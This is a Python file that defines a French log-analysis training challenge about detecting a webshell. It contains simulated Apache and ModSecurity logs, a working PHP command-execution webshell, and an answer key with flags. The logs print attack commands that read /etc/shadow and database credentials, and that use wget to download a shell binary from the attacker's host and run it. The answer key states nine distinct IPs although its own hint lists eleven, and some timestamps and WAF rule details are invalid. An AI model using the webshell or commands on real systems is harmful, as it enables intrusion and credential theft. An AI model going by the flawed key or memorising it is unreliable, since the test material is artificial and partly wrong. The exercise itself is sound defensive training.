"""
Challenge 4 — Détection de Webshell
Niveau : 2 (Analyste Confirmé)
Catégorie : Analyse de Logs
"""

ARTIFACT_ACCESS_LOG = r"""# === Extrait access.log Apache — srv-web-01 — /var/log/apache2/access.log ===
# === Période : 18/Feb/2026 05:00 — 10:00 UTC+1 ===
# === Format : Combined Log Format (IP - user [date] "request" status size "referer" "UA") ===

# --- Cron monitoring interne (Nagios) ---
10.0.1.10 - nagios [18/Feb/2026:05:00:01 +0100] "GET /server-status?auto HTTP/1.1" 200 1456 "-" "check_http/v2.3.3 (monitoring-plugins 2.3.3)"
10.0.1.10 - nagios [18/Feb/2026:05:05:01 +0100] "GET /server-status?auto HTTP/1.1" 200 1423 "-" "check_http/v2.3.3 (monitoring-plugins 2.3.3)"
10.0.1.10 - nagios [18/Feb/2026:05:10:01 +0100] "GET /server-status?auto HTTP/1.1" 200 1489 "-" "check_http/v2.3.3 (monitoring-plugins 2.3.3)"
10.0.1.10 - nagios [18/Feb/2026:05:15:01 +0100] "GET /server-status?auto HTTP/1.1" 200 1401 "-" "check_http/v2.3.3 (monitoring-plugins 2.3.3)"

# --- Déploiement automatique interne (pipeline CI/CD) ---
10.0.1.50 - deploy [18/Feb/2026:06:00:01 +0100] "GET /index.php HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (compatible; DeployBot/3.1)"
10.0.1.50 - deploy [18/Feb/2026:06:00:02 +0100] "GET /css/style.css HTTP/1.1" 200 8923 "https://www.redpawn-corp.com/" "Mozilla/5.0 (compatible; DeployBot/3.1)"
10.0.1.50 - deploy [18/Feb/2026:06:00:03 +0100] "GET /js/app.js HTTP/1.1" 200 12456 "https://www.redpawn-corp.com/" "Mozilla/5.0 (compatible; DeployBot/3.1)"
10.0.1.50 - deploy [18/Feb/2026:06:00:04 +0100] "GET /images/logo.png HTTP/1.1" 200 34567 "https://www.redpawn-corp.com/" "Mozilla/5.0 (compatible; DeployBot/3.1)"
10.0.1.50 - deploy [18/Feb/2026:06:00:05 +0100] "GET /api/health HTTP/1.1" 200 23 "-" "Mozilla/5.0 (compatible; DeployBot/3.1)"

# --- Bot SEO/Crawler légitime (Googlebot) ---
66.249.64.15 - - [18/Feb/2026:06:12:33 +0100] "GET /robots.txt HTTP/1.1" 200 245 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.15 - - [18/Feb/2026:06:12:35 +0100] "GET /index.php HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.15 - - [18/Feb/2026:06:12:38 +0100] "GET /services.php HTTP/1.1" 200 11234 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.15 - - [18/Feb/2026:06:12:42 +0100] "GET /about.php HTTP/1.1" 200 9876 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.15 - - [18/Feb/2026:06:12:48 +0100] "GET /contact.php HTTP/1.1" 200 8432 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.15 - - [18/Feb/2026:06:12:52 +0100] "GET /sitemap.xml HTTP/1.1" 200 4567 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

# --- Trafic utilisateur légitime (navigation classique) ---
93.184.216.34 - - [18/Feb/2026:07:15:22 +0100] "GET /index.php HTTP/1.1" 200 15234 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
93.184.216.34 - - [18/Feb/2026:07:15:23 +0100] "GET /css/style.css HTTP/1.1" 200 8923 "https://www.redpawn-corp.com/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
93.184.216.34 - - [18/Feb/2026:07:15:23 +0100] "GET /js/app.js HTTP/1.1" 200 12456 "https://www.redpawn-corp.com/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
93.184.216.34 - - [18/Feb/2026:07:15:24 +0100] "GET /images/logo.png HTTP/1.1" 200 34567 "https://www.redpawn-corp.com/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
93.184.216.34 - - [18/Feb/2026:07:15:30 +0100] "GET /contact.php HTTP/1.1" 200 8432 "https://www.redpawn-corp.com/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
93.184.216.34 - - [18/Feb/2026:07:16:01 +0100] "POST /contact.php HTTP/1.1" 200 156 "https://www.redpawn-corp.com/contact.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
176.58.122.89 - - [18/Feb/2026:07:22:11 +0100] "GET /index.php HTTP/1.1" 200 15234 "https://www.linkedin.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"
176.58.122.89 - - [18/Feb/2026:07:22:14 +0100] "GET /services.php HTTP/1.1" 200 11234 "https://www.redpawn-corp.com/index.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15"
176.58.122.89 - - [18/Feb/2026:07:23:05 +0100] "GET /services.php?id=3 HTTP/1.1" 200 7654 "https://www.redpawn-corp.com/services.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15"
212.83.175.42 - - [18/Feb/2026:07:45:33 +0100] "GET /index.php HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
212.83.175.42 - - [18/Feb/2026:07:45:45 +0100] "GET /about.php HTTP/1.1" 200 9876 "https://www.redpawn-corp.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Firefox/122.0"
212.83.175.42 - - [18/Feb/2026:07:46:12 +0100] "GET /careers.php HTTP/1.1" 200 6789 "https://www.redpawn-corp.com/about.php" "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Firefox/122.0"

# --- Scanner de vulnérabilité interne (Nessus — planifié) ---
10.0.1.25 - svc-nessus [18/Feb/2026:08:00:01 +0100] "GET /index.php HTTP/1.1" 200 15234 "-" "Mozilla/5.0 [en] (X11, U; Nessus SOAP)"
10.0.1.25 - svc-nessus [18/Feb/2026:08:00:02 +0100] "GET /wp-login.php HTTP/1.1" 404 1234 "-" "Mozilla/5.0 [en] (X11, U; Nessus SOAP)"
10.0.1.25 - svc-nessus [18/Feb/2026:08:00:03 +0100] "GET /wp-admin/ HTTP/1.1" 404 1234 "-" "Mozilla/5.0 [en] (X11, U; Nessus SOAP)"
10.0.1.25 - svc-nessus [18/Feb/2026:08:00:04 +0100] "GET /admin/ HTTP/1.1" 403 567 "-" "Mozilla/5.0 [en] (X11, U; Nessus SOAP)"
10.0.1.25 - svc-nessus [18/Feb/2026:08:00:05 +0100] "GET /phpmyadmin/ HTTP/1.1" 404 1234 "-" "Mozilla/5.0 [en] (X11, U; Nessus SOAP)"
10.0.1.25 - svc-nessus [18/Feb/2026:08:00:06 +0100] "GET /.git/config HTTP/1.1" 404 1234 "-" "Mozilla/5.0 [en] (X11, U; Nessus SOAP)"
10.0.1.25 - svc-nessus [18/Feb/2026:08:00:07 +0100] "GET /.env HTTP/1.1" 404 1234 "-" "Mozilla/5.0 [en] (X11, U; Nessus SOAP)"
10.0.1.25 - svc-nessus [18/Feb/2026:08:00:08 +0100] "GET /server-info HTTP/1.1" 403 567 "-" "Mozilla/5.0 [en] (X11, U; Nessus SOAP)"

# --- Second scanner (bruit : Shodan — externe, commun) ---
71.6.167.142 - - [18/Feb/2026:08:12:44 +0100] "GET / HTTP/1.1" 200 15234 "-" "Mozilla/5.0 zgrab/0.x"
71.6.167.142 - - [18/Feb/2026:08:12:45 +0100] "GET /favicon.ico HTTP/1.1" 404 1234 "-" "Mozilla/5.0 zgrab/0.x"

# --- Autre scanner internet (Censys) ---
167.248.133.56 - - [18/Feb/2026:08:18:02 +0100] "GET / HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"

# --- Utilisateur mobile légitime ---
78.192.45.123 - - [18/Feb/2026:08:25:11 +0100] "GET /index.php HTTP/1.1" 200 15234 "https://www.google.fr/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
78.192.45.123 - - [18/Feb/2026:08:25:14 +0100] "GET /css/mobile.css HTTP/1.1" 200 4567 "https://www.redpawn-corp.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1)"
78.192.45.123 - - [18/Feb/2026:08:25:30 +0100] "GET /contact.php HTTP/1.1" 200 8432 "https://www.redpawn-corp.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1)"

# =====================================================================
# === DÉBUT DE L'ACTIVITÉ SUSPECTE ===
# =====================================================================

# --- Phase 1: Scan de répertoires (User-Agent suspect) ---
185.234.72.19 - - [18/Feb/2026:08:30:15 +0100] "GET / HTTP/1.1" 200 15234 "-" "Mozlila/5.0 (Linux; Android 7.0) Chrome/59.0.3071.125"
185.234.72.19 - - [18/Feb/2026:08:30:16 +0100] "GET /robots.txt HTTP/1.1" 200 245 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:17 +0100] "GET /wp-login.php HTTP/1.1" 404 1234 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:18 +0100] "GET /admin/ HTTP/1.1" 403 567 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:19 +0100] "GET /administrator/ HTTP/1.1" 404 1234 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:19.5 +0100] "GET /admin.php HTTP/1.1" 404 1234 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:20 +0100] "GET /phpmyadmin/ HTTP/1.1" 404 1234 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:20.5 +0100] "GET /wp-admin/ HTTP/1.1" 404 1234 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:21 +0100] "GET /config.php HTTP/1.1" 404 1234 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:21.5 +0100] "GET /.env HTTP/1.1" 404 1234 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:22 +0100] "GET /.git/config HTTP/1.1" 404 1234 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:22.5 +0100] "GET /xmlrpc.php HTTP/1.1" 404 1234 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:23 +0100] "GET /backup/ HTTP/1.1" 404 1234 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:24 +0100] "GET /cgi-bin/ HTTP/1.1" 403 567 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:25 +0100] "GET /uploads/ HTTP/1.1" 200 3456 "-" "Mozlila/5.0"

# --- Trafic légitime intercalé (pendant l'attaque) ---
93.184.216.34 - - [18/Feb/2026:08:30:28 +0100] "GET /services.php?id=2 HTTP/1.1" 200 7890 "https://www.redpawn-corp.com/services.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
10.0.1.10 - nagios [18/Feb/2026:08:30:30 +0100] "GET /server-status?auto HTTP/1.1" 200 1478 "-" "check_http/v2.3.3 (monitoring-plugins 2.3.3)"

# --- Phase 2: Upload du webshell (changement de User-Agent → python-requests) ---
185.234.72.19 - - [18/Feb/2026:08:31:02 +0100] "POST /upload.php HTTP/1.1" 200 89 "-" "python-requests/2.28.1"

# --- Trafic légitime intercalé ---
78.192.45.123 - - [18/Feb/2026:08:31:03 +0100] "POST /contact.php HTTP/1.1" 200 156 "https://www.redpawn-corp.com/contact.php" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1)"

# --- Phase 3: Vérification & exploitation du webshell ---
185.234.72.19 - - [18/Feb/2026:08:31:05 +0100] "GET /uploads/logo-update.php HTTP/1.1" 200 45 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:10 +0100] "POST /uploads/logo-update.php HTTP/1.1" 200 1289 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:15 +0100] "POST /uploads/logo-update.php?cmd=id HTTP/1.1" 200 56 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:20 +0100] "POST /uploads/logo-update.php?cmd=cat+/etc/passwd HTTP/1.1" 200 2345 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:25 +0100] "POST /uploads/logo-update.php?cmd=ls+-la+/var/www/html/ HTTP/1.1" 200 1567 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:30 +0100] "POST /uploads/logo-update.php?cmd=uname+-a HTTP/1.1" 200 189 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:35 +0100] "POST /uploads/logo-update.php?cmd=cat+/proc/version HTTP/1.1" 200 234 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:40 +0100] "POST /uploads/logo-update.php?cmd=ps+aux HTTP/1.1" 200 4567 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:45 +0100] "POST /uploads/logo-update.php?cmd=wget+http://185.234.72.19:8080/shell.elf+-O+/tmp/.update HTTP/1.1" 200 23 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:50 +0100] "POST /uploads/logo-update.php?cmd=chmod+%2Bx+/tmp/.update HTTP/1.1" 200 12 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:55 +0100] "POST /uploads/logo-update.php?cmd=/tmp/.update HTTP/1.1" 200 34 "-" "python-requests/2.28.1"

# --- Trafic légitime intercalé ---
212.83.175.42 - - [18/Feb/2026:08:32:10 +0100] "GET /index.php HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
10.0.1.10 - nagios [18/Feb/2026:08:35:01 +0100] "GET /server-status?auto HTTP/1.1" 200 1501 "-" "check_http/v2.3.3 (monitoring-plugins 2.3.3)"

# --- Phase 4: Post-exploitation (exfiltration, pivot) ---
185.234.72.19 - - [18/Feb/2026:08:35:00 +0100] "POST /uploads/logo-update.php?cmd=cat+/etc/shadow HTTP/1.1" 200 1456 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:35:30 +0100] "POST /uploads/logo-update.php?cmd=cat+/etc/crontab HTTP/1.1" 200 456 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:36:00 +0100] "POST /uploads/logo-update.php?cmd=find+/+-name+"*.conf"+-type+f HTTP/1.1" 200 5678 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:36:30 +0100] "POST /uploads/logo-update.php?cmd=cat+/etc/ssh/sshd_config HTTP/1.1" 200 3456 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:37:00 +0100] "POST /uploads/logo-update.php?cmd=cat+/var/www/config/database.php HTTP/1.1" 200 234 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:37:30 +0100] "POST /uploads/logo-update.php?cmd=netstat+-tlnp HTTP/1.1" 200 1234 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:38:00 +0100] "POST /uploads/logo-update.php?cmd=ip+route+show HTTP/1.1" 200 456 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:38:30 +0100] "POST /uploads/logo-update.php?cmd=arp+-a HTTP/1.1" 200 789 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:39:00 +0100] "POST /uploads/logo-update.php?cmd=ss+-tlnp HTTP/1.1" 200 567 "-" "python-requests/2.28.1"

# --- Trafic légitime post-attaque ---
10.0.1.10 - nagios [18/Feb/2026:08:40:01 +0100] "GET /server-status?auto HTTP/1.1" 200 1534 "-" "check_http/v2.3.3 (monitoring-plugins 2.3.3)"
93.184.216.34 - - [18/Feb/2026:08:55:12 +0100] "GET /index.php HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
10.0.1.50 - deploy [18/Feb/2026:09:00:01 +0100] "GET /index.php HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (compatible; DeployBot/3.1)"
10.0.1.50 - deploy [18/Feb/2026:09:00:02 +0100] "GET /api/health HTTP/1.1" 200 23 "-" "Mozilla/5.0 (compatible; DeployBot/3.1)"
66.249.64.15 - - [18/Feb/2026:09:15:22 +0100] "GET /index.php HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"""

ARTIFACT_ERROR_LOG = r"""# === Extrait error.log Apache — srv-web-01 — /var/log/apache2/error.log ===
# === Période : 18/Feb/2026 05:00 — 10:00 UTC+1 ===

[Tue Feb 18 06:00:04.234567 2026] [core:notice] [pid 1234] AH00094: Command line: '/usr/sbin/apache2'
[Tue Feb 18 08:00:05.567890 2026] [authz_core:error] [pid 5678] [client 10.0.1.25:54321] AH01630: client denied by server configuration: /var/www/html/admin/
[Tue Feb 18 08:00:08.123456 2026] [authz_core:error] [pid 5679] [client 10.0.1.25:54322] AH01630: client denied by server configuration: /var/www/html/server-info
[Tue Feb 18 08:30:18.345678 2026] [authz_core:error] [pid 5680] [client 185.234.72.19:49152] AH01630: client denied by server configuration: /var/www/html/admin/
[Tue Feb 18 08:30:24.456789 2026] [authz_core:error] [pid 5681] [client 185.234.72.19:49153] AH01630: client denied by server configuration: /var/www/html/cgi-bin/
[Tue Feb 18 08:31:10.567890 2026] [php:warn] [pid 5682] [client 185.234.72.19:49200] PHP Warning:  system(): Cannot execute a blank command in /var/www/html/uploads/logo-update.php on line 10
[Tue Feb 18 08:31:15.678901 2026] [php:notice] [pid 5683] [client 185.234.72.19:49201] sh: 1: command output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
[Tue Feb 18 08:35:00.789012 2026] [php:notice] [pid 5684] [client 185.234.72.19:49250] sh: shadow file read by www-data — POTENTIAL PRIVILEGE ISSUE
[Tue Feb 18 08:37:00.890123 2026] [php:notice] [pid 5685] [client 185.234.72.19:49300] sh: database config read — contains credentials
"""

ARTIFACT_WAF_LOG = r"""# === ModSecurity WAF — Audit Log (extrait) ===
# === srv-web-01 — /var/log/modsec_audit.log ===

[18/Feb/2026:08:30:17 +0100] Rule 920350: Host header is a numeric IP
  IP: 185.234.72.19 | URI: /wp-login.php | ACTION: PASS (detection only)

[18/Feb/2026:08:30:18 +0100] Rule 930110: Path Traversal Attack (/../)
  IP: 185.234.72.19 | URI: /admin/ | ACTION: BLOCK (403)

[18/Feb/2026:08:30:24 +0100] Rule 930110: Path Traversal Attack
  IP: 185.234.72.19 | URI: /cgi-bin/ | ACTION: BLOCK (403)

[18/Feb/2026:08:31:02 +0100] Rule 933210: PHP Injection Attack
  IP: 185.234.72.19 | URI: /upload.php | BODY: multipart/form-data (logo-update.php)
  ACTION: PASS — Rule in detection-only mode (CRS anomaly score: 15/25 threshold)

[18/Feb/2026:08:31:15 +0100] Rule 932100: Remote Command Execution (RCE)
  IP: 185.234.72.19 | URI: /uploads/logo-update.php?cmd=id
  ACTION: PASS — Rule in detection-only mode (score: 20/25)

[18/Feb/2026:08:31:20 +0100] Rule 932100: Remote Command Execution (RCE)
  IP: 185.234.72.19 | URI: /uploads/logo-update.php?cmd=cat+/etc/passwd
  ACTION: LOG ONLY — Paranoia Level 1, score 20/25, threshold 25

[18/Feb/2026:08:31:45 +0100] Rule 932150: Remote Command Execution (wget)
  IP: 185.234.72.19 | URI: /uploads/logo-update.php?cmd=wget+http://185.234.72.19:8080/shell.elf...
  ACTION: LOG ONLY — score 22/25 (still below threshold!)

[18/Feb/2026:08:35:00 +0100] Rule 932100: Remote Command Execution (cat /etc/shadow)
  IP: 185.234.72.19 | URI: /uploads/logo-update.php?cmd=cat+/etc/shadow
  ACTION: LOG ONLY — score 20/25

NOTE: Le WAF ModSecurity était configuré en mode "detection only" (SecRuleEngine DetectionOnly).
Le seuil d'anomalie (25) n'a JAMAIS été atteint, donc AUCUNE requête n'a été bloquée par le WAF.
Seules les règles de contrôle d'accès Apache (admin/, cgi-bin/) ont bloqué certaines requêtes.
"""

ARTIFACT_WEBSHELL = r"""<?php
// logo-update.php — "Image processing utility"
// Last modified: 2026-02-18

@error_reporting(0);
@set_time_limit(0);

if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    if(function_exists('system')){
        @system($cmd . ' 2>&1', $ret);
    } elseif(function_exists('passthru')){
        @passthru($cmd . ' 2>&1', $ret);
    } elseif(function_exists('exec')){
        @exec($cmd . ' 2>&1', $output, $ret);
        echo implode("\n", $output);
    } elseif(function_exists('shell_exec')){
        echo @shell_exec($cmd . ' 2>&1');
    }
} else {
    echo "OK";
}
?>
"""

CHALLENGE = {
    "id": "c04_webshell",
    "title": "🕷️ Le Faux Logo",
    "category": "log_analysis",
    "level": 2,
    "points_total": 530,
    "estimated_time": "40-60 min",
    "story": """
## 📋 Briefing de Mission

**Date :** 18 février 2026, 14h00  
**Priorité :** CRITIQUE  
**Source :** Alerte IDS — Snort rule `WEB-PHP Command Injection`

---

L'IDS a déclenché une alerte sur le serveur web **srv-web-01**. Des requêtes HTTP suspectes contenant des commandes système ont été détectées.

L'équipe N1 vous escalade le cas :

> *"L'IDS remonte des alertes de command injection sur le site web. On pense qu'il y a un webshell. Le problème c'est qu'on a aussi des scans Nessus planifiés et des bots SEO qui font du bruit dans les logs. J'ai extrait l'access.log, l'error.log, et les logs WAF ModSecurity. Trie le bruit du vrai, reconstitue tout ce que l'attaquant a fait, et explique pourquoi le WAF n'a rien bloqué."*

Vous avez accès aux logs Apache (access + error), aux logs du WAF ModSecurity, et au fichier suspect trouvé sur le serveur.
    """,
    "artifacts": [
        {
            "name": "access.log",
            "type": "log",
            "content": ARTIFACT_ACCESS_LOG,
            "description": "Extrait du fichier access.log Apache de srv-web-01 (5h de trafic)"
        },
        {
            "name": "logo-update.php",
            "type": "code",
            "content": ARTIFACT_WEBSHELL,
            "description": "Fichier suspect trouvé dans /var/www/html/uploads/"
        },
        {
            "name": "error.log",
            "type": "log",
            "content": ARTIFACT_ERROR_LOG,
            "description": "Extrait du fichier error.log Apache de srv-web-01"
        },
        {
            "name": "modsec_audit.log",
            "type": "log",
            "content": ARTIFACT_WAF_LOG,
            "description": "Logs du WAF ModSecurity (audit log)"
        }
    ],
    "questions": [
        {
            "id": "q1",
            "text": "Combien d'adresses IP distinctes (internes + externes) apparaissent dans l'access.log ?",
            "answer": "9",
            "flag": "REDPAWN{9}",
            "points": 40,
            "hints": [
                "Comptez toutes les IPs uniques dans le fichier access.log",
                "Internes: 10.0.1.10, 10.0.1.50, 10.0.1.25 / Externes: 66.249.64.15, 93.184.216.34, 176.58.122.89, 212.83.175.42, 78.192.45.123, 71.6.167.142, 167.248.133.56, 185.234.72.19"
            ],
            "hint_cost": 13
        },
        {
            "id": "q2",
            "text": "Le scan de répertoires du scanner Nessus interne et celui de l'attaquant se ressemblent. Quel élément clé les distingue ?",
            "answer": "Mozlila",
            "flag": "REDPAWN{Mozlila}",
            "points": 50,
            "hints": [
                "Comparez le User-Agent du scanner 10.0.1.25 avec celui de 185.234.72.19",
                "Le scanner Nessus utilise 'Nessus SOAP', l'attaquant a un User-Agent mal orthographié"
            ],
            "hint_cost": 17
        },
        {
            "id": "q3",
            "text": "Par quel endpoint l'attaquant a-t-il uploadé le webshell ? (chemin complet)",
            "answer": "/upload.php",
            "flag": "REDPAWN{/upload.php}",
            "points": 40,
            "hints": [
                "Cherchez la première requête POST avec python-requests",
                "C'est la page d'upload du site"
            ],
            "hint_cost": 13
        },
        {
            "id": "q4",
            "text": "Quel est le nom complet du fichier webshell déposé ?",
            "answer": "logo-update.php",
            "flag": "REDPAWN{logo-update.php}",
            "points": 30,
            "hints": [
                "Regardez le fichier accédé dans /uploads/ juste après l'upload",
                "Le nom fait semblant d'être un utilitaire d'image"
            ],
            "hint_cost": 10
        },
        {
            "id": "q5",
            "text": "L'attaquant change d'outil entre le scan et l'exploitation. Quel User-Agent utilise-t-il pour le webshell ?",
            "answer": "python-requests/2.28.1",
            "flag": "REDPAWN{python-requests}",
            "points": 40,
            "hints": [
                "Comparez le User-Agent du scan (Mozlila) avec celui des requêtes POST sur logo-update.php",
                "C'est une bibliothèque Python"
            ],
            "hint_cost": 13
        },
        {
            "id": "q6",
            "text": "Quel est le chemin complet du reverse shell téléchargé par l'attaquant sur le serveur ?",
            "answer": "/tmp/.update",
            "flag": "REDPAWN{/tmp/.update}",
            "points": 50,
            "hints": [
                "Cherchez une commande wget dans les requêtes",
                "Le fichier est caché (commence par un point) dans /tmp"
            ],
            "hint_cost": 17
        },
        {
            "id": "q7",
            "text": "L'attaquant a lu un fichier critique contenant les mots de passe hashés. Quel fichier ? (chemin complet)",
            "answer": "/etc/shadow",
            "flag": "REDPAWN{/etc/shadow}",
            "points": 40,
            "hints": [
                "Cherchez la commande 'cat' sur un fichier sensible du système",
                "Ce fichier contient les hashes des mots de passe sous Linux"
            ],
            "hint_cost": 13
        },
        {
            "id": "q8",
            "text": "Quel fichier de configuration l'attaquant a-t-il exfiltré pour obtenir des credentials de base de données ? (chemin complet)",
            "answer": "/var/www/config/database.php",
            "flag": "REDPAWN{/var/www/config/database.php}",
            "points": 40,
            "hints": [
                "Regardez les commandes cmd=cat ciblant des fichiers de configuration",
                "C'est un fichier de configuration de base de données"
            ],
            "hint_cost": 13
        },
        {
            "id": "q9",
            "text": "Le WAF ModSecurity a loggé les attaques mais ne les a PAS bloquées. Quel mode était activé ?",
            "answer": "DetectionOnly",
            "flag": "REDPAWN{DetectionOnly}",
            "points": 50,
            "hints": [
                "Regardez la note en bas du fichier modsec_audit.log",
                "SecRuleEngine peut être en 'On', 'Off', ou '???'"
            ],
            "hint_cost": 17
        },
        {
            "id": "q10",
            "text": "Quel est le score d'anomalie maximum atteint par les requêtes de l'attaquant dans le WAF ? (nombre)",
            "answer": "22",
            "flag": "REDPAWN{22}",
            "points": 40,
            "hints": [
                "Regardez les scores dans les logs ModSecurity",
                "Le score le plus élevé est sur la ligne avec wget"
            ],
            "hint_cost": 13
        },
        {
            "id": "q11",
            "text": "Sous quel utilisateur Linux le webshell s'exécute-t-il ? (visible dans l'error.log)",
            "answer": "www-data",
            "flag": "REDPAWN{www-data}",
            "points": 30,
            "hints": [
                "Regardez la sortie de la commande 'id' dans l'error.log",
                "uid=33(???)"
            ],
            "hint_cost": 10
        },
        {
            "id": "q12",
            "text": "Combien de commandes de reconnaissance réseau l'attaquant exécute-t-il après le reverse shell ? (netstat, ip route, arp, ss)",
            "answer": "4",
            "flag": "REDPAWN{4}",
            "points": 30,
            "hints": [
                "Comptez les commandes réseau dans la Phase 4 de l'access.log"
            ],
            "hint_cost": 10
        },
        {
            "id": "q13",
            "text": "Depuis quel serveur l'attaquant télécharge-t-il le reverse shell ? (format IP:port)",
            "answer": "185.234.72.19:8080",
            "flag": "REDPAWN{185.234.72.19:8080}",
            "points": 50,
            "hints": [
                "Regardez la commande wget dans les requêtes",
                "Le format est IP:port"
            ],
            "hint_cost": 17
        }
    ]
}
